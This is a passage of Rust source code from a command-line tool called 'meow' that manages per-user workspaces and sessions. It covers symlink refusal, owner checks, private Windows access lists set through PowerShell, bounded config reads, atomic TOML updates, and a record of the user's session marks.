$allow = [System.Security.AccessControl.AccessControlType]::Allow
foreach ($s in @($env:MEOW_USER_SID, 'S-1-5-18', 'S-1-5-32-544')) {
    $sid = New-Object System.Security.Principal.SecurityIdentifier($s)
    $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sid, $full, $allow)))
}
[System.IO.File]::SetAccessControl($item.FullName, $acl)
"#;
    run_windows_acl_script(path, SCRIPT)
}

/// Verifies ownership of `root` and every entry inside it without following
/// reparse points, sets a clean protected DACL on `root`, and resets explicit
/// ACEs on every child so all descendants inherit solely from `root`.
#[cfg(windows)]
fn enforce_private_tree(root: &Path) -> io::Result<()> {
    const SCRIPT: &str = r#"
$ErrorActionPreference = 'Stop'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$rootItem = Get-Item -LiteralPath $env:MEOW_ACL_PATH -Force
if ($rootItem.Attributes -band [System.IO.FileAttributes]::ReparsePoint) { exit 2 }
if (-not $rootItem.PSIsContainer) { exit 4 }
$checkOwner = {
    param($it)
    $sec = $it.GetAccessControl([System.Security.AccessControl.AccessControlSections]::Owner)
    $own = $sec.GetOwner([System.Security.Principal.SecurityIdentifier]).Value
    if ($own -ne $env:MEOW_USER_SID -and $own -ne $env:MEOW_TOKEN_OWNER_SID -and $own -ne 'S-1-5-18') {
        exit 3
    }
}
& $checkOwner $rootItem
$rootAcl = New-Object System.Security.AccessControl.DirectorySecurity
$rootAcl.SetAccessRuleProtection($true, $false)
$inherit = [System.Security.AccessControl.InheritanceFlags]'ContainerInherit, ObjectInherit'
$none = [System.Security.AccessControl.PropagationFlags]::None
$full = [System.Security.AccessControl.FileSystemRights]::FullControl
$allow = [System.Security.AccessControl.AccessControlType]::Allow
foreach ($s in @($env:MEOW_USER_SID, 'S-1-5-18', 'S-1-5-32-544')) {
    $sid = New-Object System.Security.Principal.SecurityIdentifier($s)
    $rootAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($sid, $full, $inherit, $none, $allow)))
}
[System.IO.Directory]::SetAccessControl($rootItem.FullName, $rootAcl)

$queue = New-Object System.Collections.Generic.Queue[System.IO.DirectoryInfo]
$queue.Enqueue([System.IO.DirectoryInfo]$rootItem)
while ($queue.Count -gt 0) {
    $dir = $queue.Dequeue()
    foreach ($child in $dir.EnumerateFileSystemInfos()) {
        if ($child.Attributes -band [System.IO.FileAttributes]::ReparsePoint) { exit 2 }
        & $checkOwner $child
        if ($child -is [System.IO.DirectoryInfo]) {
            $cAcl = New-Object System.Security.AccessControl.DirectorySecurity
            $cAcl.SetAccessRuleProtection($false, $false)
            [System.IO.Directory]::SetAccessControl($child.FullName, $cAcl)
            $queue.Enqueue([System.IO.DirectoryInfo]$child)
        } else {
            $cAcl = New-Object System.Security.AccessControl.FileSecurity
            $cAcl.SetAccessRuleProtection($false, $false)
            [System.IO.File]::SetAccessControl($child.FullName, $cAcl)
        }
    }
}
"#;
    run_windows_acl_script(root, SCRIPT)
}

/// Reads a regular workspace/config file without following symlinks and
/// enforces an explicit `max_bytes` upper bound.
pub(crate) fn read_private_bounded(path: &Path, max_bytes: u64) -> Result<String> {
    refuse_file_symlink(path)?;
    #[cfg(windows)]
    verify_windows_owner(path).with_context(|| format!("refusing {}", path.display()))?;
    let mut options = private_open_options();
    options.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK);
    }
    let file = options
        .open(path)
        .with_context(|| format!("cannot read {}", path.display()))?;
    let meta = file
        .metadata()
        .with_context(|| format!("cannot stat {}", path.display()))?;
    if !meta.is_file() {
        bail!("{} is not a regular file", path.display());
    }
    #[cfg(unix)]
    verify_unix_owner_meta(&meta, path).with_context(|| format!("refusing {}", path.display()))?;
    if meta.len() > max_bytes {
        bail!(
            "{} exceeds maximum size ({max_bytes} bytes)",
            path.display()
        );
    }
    let mut bytes = Vec::new();
    file.take(max_bytes.saturating_add(1))
        .read_to_end(&mut bytes)
        .with_context(|| format!("cannot read {}", path.display()))?;
    if bytes.len() as u64 > max_bytes {
        bail!(
            "{} exceeds maximum size ({max_bytes} bytes)",
            path.display()
        );
    }
    String::from_utf8(bytes).with_context(|| format!("{} is not valid UTF-8", path.display()))
}

/// A workspace root must be a real directory, never a symlink: a cloned
/// repository could ship `.meow -> ~/.ssh`.
fn refuse_symlink(dir: &Path) -> Result<()> {
    match fs::symlink_metadata(dir) {
        Ok(meta) if meta.file_type().is_symlink() => bail!(
            "{} is a symbolic link; refusing to use it as a workspace",
            dir.display()
        ),
        Ok(meta) if !meta.is_dir() => bail!("{} exists and is not a directory", dir.display()),
        #[cfg(unix)]
        Ok(meta) => {
            verify_unix_owner_meta(&meta, dir)
                .with_context(|| format!("refusing {}", dir.display()))?;
            Ok(())
        }
        #[cfg(windows)]
        Ok(_) => {
            verify_windows_owner(dir).with_context(|| format!("refusing {}", dir.display()))?;
            Ok(())
        }
        #[cfg(not(any(unix, windows)))]
        Ok(_) => Ok(()),
        Err(err) if err.kind() == io::ErrorKind::NotFound => Ok(()),
        Err(err) => Err(err).with_context(|| format!("cannot inspect {}", dir.display())),
    }
}

pub(crate) fn refuse_file_symlink(path: &Path) -> Result<()> {
    if fs::symlink_metadata(path).is_ok_and(|meta| meta.file_type().is_symlink()) {
        bail!(
            "{} is a symbolic link; refusing to use it in a workspace",
            path.display()
        );
    }
    Ok(())
}

const MAX_CONFIG_BYTES: u64 = 1024 * 1024;

// ---------------------------------------------------------------------------
// config.toml
// ---------------------------------------------------------------------------

/// Global settings from `~/.meow/config.toml`. Unknown keys are ignored so
/// older builds can read files written by newer ones.
#[derive(Debug, Clone, Default, PartialEq, Eq, Deserialize)]
#[serde(default)]
pub struct Config {
    /// Mode given to newly created workspaces.
    pub default_mode: Mode,
    /// Shell program to launch instead of the platform default.
    pub shell: Option<String>,
    pub cve: CveSettings,
    pub recon: ReconSettings,
    pub ai: AiSettings,
    pub location: LocationSettings,
}

impl Config {
    /// Loads `config.toml`, writing a commented default file on first use.
    pub fn load_or_create(home: &MeowHome) -> Result<Self> {
        create_private_dir(home.root())?;
        let path = home.config_path();
        refuse_file_symlink(&path)?;
        refuse_file_symlink(&home.ai_path())?;
        match private_open_options()
            .write(true)
            .create_new(true)
            .open(&path)
        {
            Ok(mut file) => file
                .write_all(CONFIG_TEMPLATE.as_bytes())
                .with_context(|| format!("cannot write {}", path.display()))?,
            Err(e) if e.kind() == io::ErrorKind::AlreadyExists => {}
            Err(e) => return Err(e).with_context(|| format!("cannot create {}", path.display())),
        }
        restrict_file(&path).with_context(|| format!("cannot restrict {}", path.display()))?;
        let text = read_private_bounded(&path, MAX_CONFIG_BYTES)?;
        let mut config: Config = parse_toml(&text, &path)?;
        // Each user's own AI setup lives beside the config, not in it.
        config.ai.user_file = Some(home.ai_path());
        config.ai.usage_file = Some(home.root().join(crate::usage::FILE));
        config.recon.wordlist_dir = Some(home.root().join("wordlists"));
        Ok(config)
    }

    /// Updates `default_mode` and `[cve]` (`enabled`, `nvd_api_key`) in
    /// `config.toml` atomically while preserving comments and other sections.
    pub fn save_setup_preferences(
        home: &MeowHome,
        default_mode: Mode,
        cve_enabled: bool,
        nvd_api_key: Option<&str>,
    ) -> Result<()> {
        Self::save_setup_preferences_with_location(
            home,
            default_mode,
            cve_enabled,
            nvd_api_key,
            None,
        )
    }

    /// Updates `default_mode`, `[cve]` (`enabled`, `nvd_api_key`), and
    /// optionally `[location]` (`enabled`, `map`) in `config.toml` atomically.
    pub fn save_setup_preferences_with_location(
        home: &MeowHome,
        default_mode: Mode,
        cve_enabled: bool,
        nvd_api_key: Option<&str>,
        location_prefs: Option<(bool, bool)>,
    ) -> Result<()> {
        let _ = Self::load_or_create(home)?;
        let path = home.config_path();
        let existing = read_private_bounded(&path, MAX_CONFIG_BYTES)?;
        let clean_key = nvd_api_key.map(str::trim).filter(|k| !k.is_empty());
        let updated = update_config_toml(
            &existing,
            default_mode,
            cve_enabled,
            clean_key,
            location_prefs,
        )?;
        let parsed: Config = parse_toml(&updated, &path).context("refusing to write the change")?;
        if parsed.default_mode != default_mode
            || parsed.cve.enabled != cve_enabled
            || parsed.cve.nvd_api_key.as_deref() != clean_key
            || location_prefs.is_some_and(|(loc_en, loc_map)| {
                parsed.location.enabled != loc_en || parsed.location.map != loc_map
            })
        {
            bail!(
                "refusing to write {}: updated preferences did not round-trip cleanly",
                path.display()
            );
        }
        write_private_atomic(&path, updated.as_bytes())
    }
}

fn is_toml_key(trimmed: &str, key: &str) -> bool {
    trimmed
        .strip_prefix(key)
        .is_some_and(|rest| rest.starts_with([' ', '\t', '=']))
}

/// Extracts `name` from `[name]` or `[[name]]`, stripping any trailing `#` comment.
fn toml_section_header(trimmed: &str) -> Option<&str> {
    if !trimmed.starts_with('[') {
        return None;
    }
    let without_comment = trimmed.split('#').next()?.trim_end();
    if let Some(inner) = without_comment
        .strip_prefix("[[")
        .and_then(|s| s.strip_suffix("]]"))
    {
        return Some(inner.trim());
    }
    without_comment
        .strip_prefix('[')
        .and_then(|s| s.strip_suffix(']'))
        .map(str::trim)
}

fn update_config_toml(
    existing: &str,
    default_mode: Mode,
    cve_enabled: bool,
    nvd_api_key: Option<&str>,
    location_prefs: Option<(bool, bool)>,
) -> Result<String> {
    let encoded_key = match nvd_api_key.map(str::trim).filter(|k| !k.is_empty()) {
        Some(key) => {
            if key.chars().any(char::is_control) {
                bail!("NVD API key must not contain control characters");
            }
            Some(toml::Value::String(key.to_owned()).to_string())
        }
        None => None,
    };
    let mode_line = format!("default_mode = \"{}\"", default_mode.as_str());
    let enabled_line = format!("enabled = {cve_enabled}");

    let mut out: Vec<String> = Vec::new();
    let mut section = String::new();
    let mut wrote_mode = false;
    let mut saw_cve = false;
    let mut wrote_enabled = false;
    let mut wrote_nvd_key = false;
    let mut saw_location = false;
    let mut wrote_loc_enabled = false;
    let mut wrote_loc_map = false;

    let flush_section = |sec: &str,
                         out: &mut Vec<String>,
                         wrote_mode: &mut bool,
                         wrote_enabled: &mut bool,
                         wrote_nvd_key: &mut bool,
                         wrote_loc_enabled: &mut bool,
                         wrote_loc_map: &mut bool| {
        if sec.is_empty() && !*wrote_mode {
            out.push(mode_line.clone());
            *wrote_mode = true;
        } else if sec == "cve" {
            if !*wrote_enabled {
                out.push(enabled_line.clone());
                *wrote_enabled = true;
            }
            if !*wrote_nvd_key {
                if let Some(encoded) = &encoded_key {
                    out.push(format!("nvd_api_key = {encoded}"));
                }
                *wrote_nvd_key = true;
            }
        } else if sec == "location" {
            if let Some((loc_en, loc_map)) = location_prefs {
                if !*wrote_loc_enabled {
                    out.push(format!("enabled = {loc_en}"));
                    *wrote_loc_enabled = true;
                }
                if !*wrote_loc_map {
                    out.push(format!("map = {loc_map}"));
                    *wrote_loc_map = true;
                }
            }
        }
    };

    for line in existing.lines() {
        let trimmed = line.trim();
        if let Some(header_name) = toml_section_header(trimmed) {
            flush_section(
                &section,
                &mut out,
                &mut wrote_mode,
                &mut wrote_enabled,
                &mut wrote_nvd_key,
                &mut wrote_loc_enabled,
                &mut wrote_loc_map,
            );
            section = header_name.to_owned();
            if section == "cve" && !trimmed.starts_with("[[") {
                saw_cve = true;
            } else if section == "location" && !trimmed.starts_with("[[") {
                saw_location = true;
            }
            out.push(line.to_owned());
            continue;
        }
        if section.is_empty() && is_toml_key(trimmed, "default_mode") {
            if !wrote_mode {
                out.push(mode_line.clone());
                wrote_mode = true;
            }
            continue;
        }
        if section == "cve" && is_toml_key(trimmed, "enabled") {
            if !wrote_enabled {
                out.push(enabled_line.clone());
                wrote_enabled = true;
            }
            continue;
        }
        if section == "cve" && is_toml_key(trimmed, "nvd_api_key") {
            if !wrote_nvd_key {
                if let Some(encoded) = &encoded_key {
                    out.push(format!("nvd_api_key = {encoded}"));
                }
                wrote_nvd_key = true;
            }
            continue;
        }
        if let Some((loc_en, loc_map)) = location_prefs {
            if section == "location" && is_toml_key(trimmed, "enabled") {
                if !wrote_loc_enabled {
                    out.push(format!("enabled = {loc_en}"));
                    wrote_loc_enabled = true;
                }
                continue;
            }
            if section == "location" && is_toml_key(trimmed, "map") {
                if !wrote_loc_map {
                    out.push(format!("map = {loc_map}"));
                    wrote_loc_map = true;
                }
                continue;
            }
        }
        out.push(line.to_owned());
    }

    flush_section(
        &section,
        &mut out,
        &mut wrote_mode,
        &mut wrote_enabled,
        &mut wrote_nvd_key,
        &mut wrote_loc_enabled,
        &mut wrote_loc_map,
    );
    if !saw_cve {
        if !out.last().is_some_and(String::is_empty) {
            out.push(String::new());
        }
        out.push("[cve]".to_owned());
        out.push(enabled_line);
        if let Some(encoded) = &encoded_key {
            out.push(format!("nvd_api_key = {encoded}"));
        }
    }
    if let Some((loc_en, loc_map)) = location_prefs {
        if !saw_location {
            if !out.last().is_some_and(String::is_empty) {
                out.push(String::new());
            }
            out.push("[location]".to_owned());
            out.push(format!("enabled = {loc_en}"));
            out.push(format!("map = {loc_map}"));
        }
    }

    let mut text = out.join("\n");
    text.push('\n');
    Ok(text)
}

// ---------------------------------------------------------------------------
// profile.toml and the workspace itself
// ---------------------------------------------------------------------------

/// Per-workspace settings from `profile.toml`.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Profile {
    /// Session name the workspace was last opened as.
    pub name: String,
    pub mode: Mode,
    /// Tool flags for this workspace; they win over `config.toml`.
    #[serde(skip_serializing_if = "PresetOverride::is_empty")]
    pub recon: PresetOverride,
    /// A random mark a session outside `~/.meow` gets when this user makes
    /// or accepts it. `~/.meow/local-workspaces` lists this user's marks
    /// (with the folder of each one in a `./meow`), so a `./meow/<name>` or
    /// `./.meow` that came with a folder (a cloned repository, an unpacked
    /// archive, a copy) is told apart from the user's own.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub id: Option<String>,
}

/// The file in `~/.meow` that lists the marks of this user's sessions
/// outside `~/.meow`, one per line: `mark` alone, or `mark<TAB>folder` for
/// a session in a `./meow` folder.
const LOCAL_RECORD_FILE: &str = "local-workspaces";
/// The record is kept below this size; from a larger file only the newest
/// lines are read.
const LOCAL_RECORD_MAX: u64 = 1024 * 1024;

fn new_mark() -> Result<String> {
    let mut bytes = [0u8; 16];
    getrandom::fill(&mut bytes).map_err(|e| anyhow!("no secure random source: {e}"))?;
    Ok(bytes.iter().map(|byte| format!("{byte:02x}")).collect())
}

const MAX_LOCAL_MARKS: usize = 4096;

fn is_valid_mark(id: &str) -> bool {
    id.len() == 32 && id.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
}

/// One line of `~/.meow/local-workspaces`.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Entry {
    mark: String,
    /// The session folder, for a session in a `./meow` folder.
    dir: Option<PathBuf>,
}

/// A folder the record can hold: absolute, and one line of plain text.
fn recordable(dir: &Path) -> bool {
    dir.is_absolute()
        && dir
            .to_str()
            .is_some_and(|s| !s.chars().any(char::is_control))
}

/// Lines with a broken mark are dropped; a broken folder leaves the mark.
fn parse_record(text: &str) -> Vec<Entry> {
    text.lines()
        .filter_map(|line| {
            let (mark, dir) = match line.split_once('\t') {
                Some((mark, dir)) => (mark, Some(PathBuf::from(dir.trim_end_matches('\r')))),
                None => (line, None),
            };
            let mark = mark.trim();
            is_valid_mark(mark).then(|| Entry {
                mark: mark.to_owned(),
                dir: dir.filter(|dir| recordable(dir)),
            })
        })
        .collect()
}

/// The record's entries. From a file larger than meow writes it, the newest
/// lines that fit are read rather than none.
fn read_record(home: &MeowHome) -> Vec<Entry> {
    read_newest(&home.local_record_path(), LOCAL_RECORD_MAX)
        .map(|text| parse_record(&text))
        .unwrap_or_default()
}

/// Writes the record: the newest entries, as many as fit in
/// [`MAX_LOCAL_MARKS`] lines and [`LOCAL_RECORD_MAX`] bytes.
fn write_record(home: &MeowHome, entries: &[Entry]) -> Result<()> {
    create_private_dir(home.root())?;
    let mut lines = Vec::new();
    let mut size = 0u64;
    for entry in entries.iter().rev().take(MAX_LOCAL_MARKS) {
        let line = match entry.dir.as_deref().and_then(Path::to_str) {
            Some(dir) => format!("{}\t{dir}\n", entry.mark),
            None => format!("{}\n", entry.mark),
        };
        size += line.len() as u64;
        if size > LOCAL_RECORD_MAX {
            break;
        }
        lines.push(line);
    }
    lines.reverse();
    write_private_atomic(&home.local_record_path(), lines.concat().as_bytes())
}

/// Whether the session in `dir`, with this profile, is one this user made
/// or accepted there. One in a `./meow` folder counts only at the place its
/// mark was recorded for, so a copy or a moved folder is asked about again;
/// an old `./.meow` needs only its mark.
fn is_own(record: &[Entry], profile: &Profile, dir: &Path) -> bool {
    let Some(id) = profile.id.as_deref().filter(|id| is_valid_mark(id)) else {
        return false;
    };
    let in_folder = folder_session(dir).is_some();
    record.iter().any(|entry| {
        entry.mark == id
            && match &entry.dir {
                Some(recorded) => in_folder && same_dir(recorded, dir),
                None => !in_folder,
            }
    })
}

/// [`is_own`] with the record as it is now.
fn is_own_at(home: &MeowHome, profile: &Profile, dir: &Path) -> bool {
    is_own(&read_record(home), profile, dir)
}

/// Whether two paths name the same folder, however each is spelled.
fn same_dir(a: &Path, b: &Path) -> bool {
    if a == b {
        return true;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        matches!(
            (fs::metadata(a), fs::metadata(b)),
            (Ok(x), Ok(y)) if x.dev() == y.dev() && x.ino() == y.ino()
        )
    }
    #[cfg(not(unix))]
    {
        matches!(
            (fs::canonicalize(a), fs::canonicalize(b)),
            (Ok(x), Ok(y)) if x == y
        )
    }
}

/// The mark in `dir/profile.toml`: `None` when it cannot be read, `Some(None)`
/// when the profile has none.
fn profile_mark(dir: &Path) -> Option<Option<String>> {
    Profile::read(&dir.join(PROFILE_FILE)).ok().map(|p| p.id)
}

/// An entry whose session is surely gone: its folder holds another mark, or
/// its `./meow` is there without it. A folder that is out of reach (a drive
/// not mounted) keeps its entry.
fn is_stale(entry: &Entry) -> bool {
    let Some(dir) = &entry.dir else {
        return false;
    };
    match fs::symlink_metadata(dir) {
        Err(error) if error.kind() == io::ErrorKind::NotFound => {
            dir.parent().is_some_and(|sessions| sessions.is_dir())
        }
        Err(_) => false,
        Ok(_) => profile_mark(dir).is_some_and(|mark| mark.as_deref() != Some(&entry.mark)),
    }
}

/// How long a change of the record waits for other meows changing it, at
/// the worst: each holds it for one short update, but on Windows an update
/// runs a PowerShell to set the access list of `~/.meow`, about a second
/// each when a script starts many sessions at once.
const RECORD_LOCK_WAIT: Duration = Duration::from_secs(60);

/// Holds the record for one read-change-write, so two meow processes
/// changing it at once (two terminals, a script) never drop each other's
/// entries.
fn lock_record(home: &MeowHome) -> Result<crate::lock::UpdateLock> {
    create_private_dir(home.root())?;
    let path = home.root().join(format!("{LOCAL_RECORD_FILE}.lock"));
    crate::lock::UpdateLock::acquire(&path, RECORD_LOCK_WAIT).map_err(|error| match error {
        crate::lock::LockError::Held { .. } => anyhow!(
            "another meow is still changing {}; try again",
            home.local_record_path().display()
        ),
        crate::lock::LockError::Io(error) => {
            anyhow!(error).context(format!("cannot lock {}", path.display()))
        }
    })
}

/// Records `mark` as this user's, with the session folder when it is in a
/// `./meow` folder. Entries that are surely stale are dropped on the way.
/// One already recorded for that folder, however spelled, is kept as it is.
fn remember(home: &MeowHome, mark: &str, dir: Option<&Path>) -> Result<()> {
    if !is_valid_mark(mark) {
        bail!("invalid workspace mark");
    }
    let entry = Entry {
        mark: mark.to_owned(),
        dir: dir.filter(|dir| recordable(dir)).map(Path::to_path_buf),
    };
    let _lock = lock_record(home)?;
    let mut entries = read_record(home);
    let known = |known: &Entry| {
        known.mark == entry.mark
            && match (&known.dir, &entry.dir) {
                (None, None) => true,
                (Some(a), Some(b)) => same_dir(a, b),
                _ => false,
            }
    };
    if entries.iter().any(known) {
        return Ok(());
    }
    entries.retain(|known| {
        known.mark != entry.mark
            && (entry.dir.is_none() || known.dir != entry.dir)
            && !is_stale(known)
    });
    entries.push(entry);
    write_record(home, &entries)
}

/// Drops the entries of a deleted session folder: the one recorded there,
/// and any with its mark whose folder no longer holds it. Writes nothing
/// when no entry goes.
fn forget(home: &MeowHome, dir: &Path, mark: Option<&str>) -> Result<()> {
    let _lock = lock_record(home)?;
    let mut entries = read_record(home);
    let before = entries.len();
    entries.retain(|entry| match &entry.dir {
        None => true,
        Some(known) => {
            known != dir
                && (Some(entry.mark.as_str()) != mark
                    || profile_mark(known).flatten().as_deref() == Some(&entry.mark))
        }
    });
    if entries.len() == before {
        return Ok(());
    }
    write_record(home, &entries)
}

/// The session folder `dir` when it is `<folder>/meow/<name>`.
fn folder_session(dir: &Path) -> Option<&Path> {
    let name = dir.file_name()?.to_str()?;
    let sessions = dir.parent()?;
    (validate_name(name).is_ok()
        && sessions.file_name() == Some(SESSIONS_DIR.as_ref())
        && sessions.parent().is_some())
    .then_some(dir)
}

/// Whether a folder's name is the session name `name`. Folder names do not
/// tell case apart on macOS and Windows.
fn is_named(folder_name: Option<&std::ffi::OsStr>, name: &str) -> bool {
    let Some(folder_name) = folder_name else {
        return false;
    };
    if cfg!(any(target_os = "macos", windows)) {
        folder_name
            .to_str()
            .is_some_and(|folder_name| folder_name.eq_ignore_ascii_case(name))
    } else {
        folder_name == name
    }
}

/// The recorded folder of this user's session `name` in some `./meow`, if
/// it is still there and still holds the recorded mark. Newest first.
fn recorded_dir(home: &MeowHome, name: &str) -> Option<PathBuf> {
    read_record(home).into_iter().rev().find_map(|entry| {
        let dir = entry.dir?;
        let sessions = folder_session(&dir)?.parent()?;
        let here = is_named(dir.file_name(), name) && is_real_sessions_dir(sessions);
        (here && profile_mark(&dir) == Some(Some(entry.mark))).then_some(dir)
    })
}

/// A session `name` the record places in a folder that cannot be seen now
/// (a drive not mounted, or a folder deleted with its sessions).
pub fn unreachable_session(home: &MeowHome, name: &str) -> Option<PathBuf> {
    read_record(home).into_iter().rev().find_map(|entry| {
        let dir = entry.dir?;
        let sessions = folder_session(&dir)?.parent()?;
        (is_named(dir.file_name(), name) && fs::symlink_metadata(sessions).is_err()).then_some(dir)
    })
}

/// A profile is a few lines; a larger file is not one meow wrote.
const PROFILE_MAX: u64 = 64 * 1024;

impl Profile {
    fn read(path: &Path) -> Result<Self> {
        let text = read_bounded(path, PROFILE_MAX)
            .with_context(|| format!("cannot read {}", path.display()))?;
        parse_toml(&text, path)
    }
}

// ---------------------------------------------------------------------------
// Where sessions live
// ---------------------------------------------------------------------------

/// Where `meow <name>` finds or makes a session.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Location {
    /// `~/.meow/workspaces/<name>/`.
    Home,
    /// `<folder>/meow/<name>/`.
    Folder(PathBuf),
    /// `<folder>/.meow/`, made by `--local` before sessions went to `./meow`.
    Legacy(PathBuf),
}

impl Location {
    /// The session folder of `name` at this place.
    pub fn dir(&self, home: &MeowHome, name: &str) -> Result<PathBuf> {
        Ok(match self {
            Location::Home => home.workspace_dir(name),
            Location::Folder(folder) => sessions_dir(&absolute(folder)?).join(name),
            Location::Legacy(folder) => home.local_dir(folder)?,
        })
    }
}

fn absolute(path: &Path) -> Result<PathBuf> {
    std::path::absolute(path).with_context(|| format!("cannot resolve {}", path.display()))
}

/// `<folder>/meow`.
pub fn sessions_dir(folder: &Path) -> PathBuf {
    folder.join(SESSIONS_DIR)
}

fn has_profile(dir: &Path) -> bool {
    fs::symlink_metadata(dir.join(PROFILE_FILE)).is_ok_and(|meta| meta.is_file())
}

/// `./meow` as meow uses it: a real folder of this user's, never a link.
fn is_real_sessions_dir(sessions: &Path) -> bool {
    match fs::symlink_metadata(sessions) {
        #[cfg(unix)]
        Ok(meta) => meta.is_dir() && verify_unix_owner_meta(&meta, sessions).is_ok(),
        #[cfg(not(unix))]
        Ok(meta) => meta.is_dir(),
        Err(_) => false,
    }
}

/// Whether `./meow/<name>` of `folder` holds a session.
fn in_sessions_here(folder: &Path, name: &str) -> bool {
    let sessions = sessions_dir(folder);
    is_real_sessions_dir(&sessions) && has_profile(&sessions.join(name))
}

/// The old `./.meow` of `folder` when it holds the session `name`.
fn legacy_named(home: &MeowHome, folder: &Path, name: &str) -> Option<PathBuf> {
    let dir = home.local_dir(folder).ok()?;
    let profile = Profile::read(&dir.join(PROFILE_FILE)).ok()?;
    (profile.name == name).then_some(dir)
}

/// The session `name` kept in `folder` itself: `./meow/<name>`, else an old
/// `./.meow` with that name.
fn here_session(home: &MeowHome, folder: &Path, name: &str) -> Option<Location> {
    if in_sessions_here(folder, name) {
        return Some(Location::Folder(folder.to_path_buf()));
    }
    legacy_named(home, folder, name).map(|_| Location::Legacy(folder.to_path_buf()))
}

/// Whether `./meow/<name>` of `folder` holds a session this user made or
/// accepted there.
fn own_here(home: &MeowHome, folder: &Path, name: &str) -> bool {
    let dir = sessions_dir(folder).join(name);
    in_sessions_here(folder, name)
        && Profile::read(&dir.join(PROFILE_FILE)).is_ok_and(|p| is_own_at(home, &p, &dir))
}

/// The user's own session `name` that is not in a folder's `./meow` they
/// run meow from: one saved in another folder, else in `~/.meow/workspaces`.
fn own_elsewhere(home: &MeowHome, name: &str) -> Option<Location> {
    if let Some(folder) = recorded_dir(home, name)
        .as_deref()
        .and_then(Path::parent)
        .and_then(Path::parent)
    {
        return Some(Location::Folder(folder.to_path_buf()));
    }
    has_profile(&home.workspace_dir(name)).then_some(Location::Home)
}

/// `./meow/<name>` of `cwd` when it holds a session this user did not make
/// or accept there (one that came with the folder).
pub fn foreign_here(home: &MeowHome, cwd: &Path, name: &str) -> Option<PathBuf> {
    let name = validate_name(name).ok()?;
    let cwd = absolute(cwd).ok()?;
    (in_sessions_here(&cwd, &name) && !own_here(home, &cwd, &name))
        .then(|| sessions_dir(&cwd).join(name))
}

/// Where the existing session `name` is, looked up in this order:
/// `./meow/<name>` of `cwd` when it is the user's own, one this user saved
/// in another folder, `~/.meow/workspaces/<name>`, a `./meow/<name>` of
/// `cwd` that came with the folder, then an old `./.meow` of `cwd` with
/// that name. One that came with a folder never hides the user's own of
/// that name. `None` when there is none. Nothing is created.
pub fn find_session(home: &MeowHome, cwd: &Path, name: &str) -> Result<Option<Location>> {
    let name = checked_name(name)?;
    let cwd = absolute(cwd)?;
    let here = in_sessions_here(&cwd, &name);
    if here && own_here(home, &cwd, &name) {
        return Ok(Some(Location::Folder(cwd)));
    }
    if let Some(own) = own_elsewhere(home, &name) {
        return Ok(Some(own));
    }
    if here {
        return Ok(Some(Location::Folder(cwd)));
    }
    if legacy_named(home, &cwd, &name).is_some() {
        return Ok(Some(Location::Legacy(cwd)));
    }
    Ok(None)
}

/// Fails when a session `name` already exists: a name is one session
/// wherever meow runs, so a new one never takes it.
fn refuse_taken(home: &MeowHome, cwd: &Path, name: &str) -> Result<()> {
    if let Some(found) = find_session(home, cwd, name)? {
        bail!(
            "Session '{name}' already exists at {}; open it with `meow {name}`, or pick another name",
            found.dir(home, name)?.display()
        );
    }
    Ok(())
}

/// `meow <name> --local`: `./meow/<name>` of `cwd`, an old `./.meow` there
/// with that name, or else a new session in `./meow/<name>` if the folder
/// may hold one and no session has that name yet.
pub fn local_location(home: &MeowHome, cwd: &Path, name: &str) -> Result<Location> {
    let name = checked_name(name)?;
    let cwd = absolute(cwd)?;
    if let Some(here) = here_session(home, &cwd, &name) {
        return Ok(here);
    }
    refuse_taken(home, &cwd, &name)?;
    check_new_folder(home, &cwd, &name).map_err(|reason| {
        anyhow!(
            "Cannot save '{name}' in {}: {reason}. Run meow from a project folder, or use --home",
            cwd.display()
        )
    })?;
    Ok(Location::Folder(cwd))
}

/// `meow <name> --home`: `~/.meow/workspaces/<name>`, new only when no
/// session has that name yet.
pub fn home_location(home: &MeowHome, cwd: &Path, name: &str) -> Result<Location> {
    let name = checked_name(name)?;
    if !has_profile(&home.workspace_dir(&name)) {
        refuse_taken(home, cwd, &name)?;
    }
    Ok(Location::Home)
}

/// The sessions in `./meow` of a folder: each subfolder with a valid name
/// and a profile, sorted by name. A linked `./meow`, or one of another
/// user's, holds none.
fn sessions_in(sessions: &Path) -> Vec<(PathBuf, String)> {
    if !is_real_sessions_dir(sessions) {
        return Vec::new();
    }
    let Ok(entries) = fs::read_dir(sessions) else {
        return Vec::new();
    };
    let mut found: Vec<(PathBuf, String)> = entries
        .flatten()
        .take(MAX_LOCAL_MARKS)
        .filter_map(|entry| {
            let name = entry.file_name().to_str().map(str::to_owned)?;
            validate_name(&name).ok()?;
            let dir = entry.path();
            has_profile(&dir).then_some((dir, name))
        })
        .collect();
    found.sort_by(|a, b| a.1.cmp(&b.1));
    found
}

/// The session `--local` means: the only one in `./meow` of `cwd`, else an
/// old `./.meow`. None, or several in `./meow`, is an error; `pick` says
/// how to name one.
pub fn local_session_dir(home: &MeowHome, cwd: &Path, pick: &str) -> Result<PathBuf> {
    let cwd = absolute(cwd)?;
    let sessions = sessions_dir(&cwd);
    let mut here = sessions_in(&sessions);
    match here.len() {
        0 => {
            let legacy = home.local_dir(&cwd)?;
            if fs::symlink_metadata(&legacy).is_ok() {
                return Ok(legacy);
            }
            bail!("No session in ./{SESSIONS_DIR} here; name one with {pick}")
        }
        1 => Ok(here.remove(0).0),
        _ => {
            let names: Vec<String> = here.into_iter().map(|(_, name)| name).collect();
            bail!(
                "{} holds several sessions ({}): pick one with {pick}",
                sessions.display(),
                names.join(", ")
            )
        }
    }
}

/// Commands that lead back to the session in `dir` from `cwd`: one that
/// opens it and one that deletes it, each `None` when no command reaches
/// it. `meow <name>` finds the user's own session of that name first, so
/// one that came with a folder may need `--local`.
pub fn commands_for(
    home: &MeowHome,
    cwd: &Path,
    dir: &Path,
    name: &str,
) -> (Option<String>, Option<String>) {
    let Ok(cwd) = absolute(cwd) else {
